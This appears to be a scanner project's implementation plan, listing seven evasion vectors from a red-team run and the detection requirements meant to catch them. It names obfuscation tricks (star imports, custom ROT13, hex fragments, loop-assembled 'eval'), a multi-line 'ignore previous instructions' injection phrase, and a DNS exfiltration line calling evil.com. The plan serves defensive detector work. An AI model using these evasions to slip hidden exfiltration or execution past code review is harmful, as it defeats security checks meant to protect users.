id: "PLAN-031"
title: "P2 red-team fixes: star imports, multi-line PI, custom ROT13, DNS exfil, hex fragments, nested comprehension, loop assembly"
type: implementation
status: Done
created: 2026-03-18

linked_spec: "corpus/red-team/2026-03-17-full/report.md"

description: |
  Fix the seven P2 (moderate gap) evasion vectors surfaced by the 2026-03-17 full
  scanner red-team. These are the next tier after the P1 fixes shipped in PLAN-030.

  Current evasion rate: 40.5% (32/79). These 7 fixes target a subset of remaining
  evasions. Expected to reduce evasion rate by ~9 percentage points (7/79).

  Each evasion has a confirmed corpus input that currently evades detection:
  1. Star imports — from os import *; system() invisible to alias tracking
  2. Multi-line PI split — "ignore\nprevious\ninstructions" split across lines
  3. Custom ROT13 — manual chr()/ord() rotation without codecs module
  4. DNS exfil via f-string — getaddrinfo(f'{data}.evil.com', 80) evades EXFIL-006
  5. Short hex fragments — bytes.fromhex('6576') + bytes.fromhex('616c') cross-call
  6. Nested comprehension — [chr(c) for row in [[ints],[ints]] for c in row]
  7. Loop assembly — for c in ['e','v','a','l']: name += c

requirements:
  file: null
  ids:
    - R001  # from os import *; system() must be detected via expanded alias map
    - R002  # Multi-line PI "ignore\nprevious\ninstructions" must trigger PI-001 via cross-line join
    - R003  # Custom ROT13 function (chr/ord arithmetic with %26) must trigger OBFS-001
    - R004  # socket.getaddrinfo(f'{data}.evil.com', 80) must trigger EXFIL-006
    - R005  # bytes.fromhex() fragment concatenation + .decode() must resolve in split detector
    - R006  # Nested comprehension [chr(c) for row in [[ints]] for c in row] must resolve in join
    - R007  # for c in [literal_list]: name += c must resolve in split detector
    - R-EFF001  # All 7 P2 corpus inputs must produce findings when scanned
    - R-EFF002  # Full corpus evasion rate must improve from 40.5% baseline
  uncovered: []

